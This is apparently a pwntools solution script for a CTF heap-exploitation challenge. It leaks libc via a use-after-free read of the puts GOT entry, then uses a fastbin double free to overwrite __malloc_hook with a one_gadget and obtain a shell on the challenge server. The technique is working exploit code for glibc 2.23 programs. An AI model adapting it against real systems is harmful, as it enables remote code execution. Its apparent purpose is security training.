from pwn import *

#context.log_level = 'debug'

pn = './gyctf_2020_some_thing_exceting'

#p = process(pn)
p = remote('node4.buuoj.cn', 25068)
elf = ELF(pn)
#libc = ELF('libc-2.23.so')
libc = ELF('libc-2.23.buu.so')

def alloc(size_ba, size_na, content_ba, content_na):
    p.sendlineafter(b'you want to do :', b'1')
    p.sendlineafter(b'> ba\'s length : ', str(size_ba).encode())
    p.sendafter(b'> ba : ', content_ba)
    p.sendlineafter(b'> na\'s length : ', str(size_na).encode())
    p.sendafter(b'> na : ', content_na)

def delete(index):
    p.sendlineafter(b'you want to do :', b'3')
    p.sendlineafter(b'> Banana ID : ', str(index).encode())

def show(index):
    p.sendlineafter(b'you want to do :', b'4')
    p.sendlineafter(b'> SCP project ID : ', str(index).encode())

#leak libc
alloc(0x30, 0x30, b'a', b'a')  #0
alloc(0x30, 0x30, b'a', b'a')  #1
delete(0)
delete(1)

alloc(0x10, 0x30, p64(elf.got['puts']), b'a') #2
show(0)

p.recvuntil(b'# Banana\'s ba is ')
puts_real_addr = u64(p.recv(6).ljust(8, b'\0'))
libc_base = puts_real_addr - libc.sym['puts']

print('libc_base -> {}'.format(hex(libc_base)))

#overwrite free_hook to system by double free
malloc_hook = libc_base + libc.sym['__malloc_hook']
system = libc_base + libc.sym['system']
realloc = libc_base + libc.sym['__libc_realloc']

alloc(0x60, 0x60, b'a', b'a')  #3
alloc(0x60, 0x60, b'a', b'a')  #4
delete(4)
delete(3)
delete(4)

one_gadget = libc_base + 0xf1147

alloc(0x60, 0x60, p64(malloc_hook - 0x23) + p64(0), b'a')
alloc(0x60, 0x60, b'a', b'a')
alloc(0x30, 0x60, b'a', b'a' * 0xb + p64(one_gadget) + p64(realloc))

print(hex(malloc_hook))
#gdb.attach(p)
#pause()

p.sendlineafter(b'you want to do :', b'1')

p.interactive()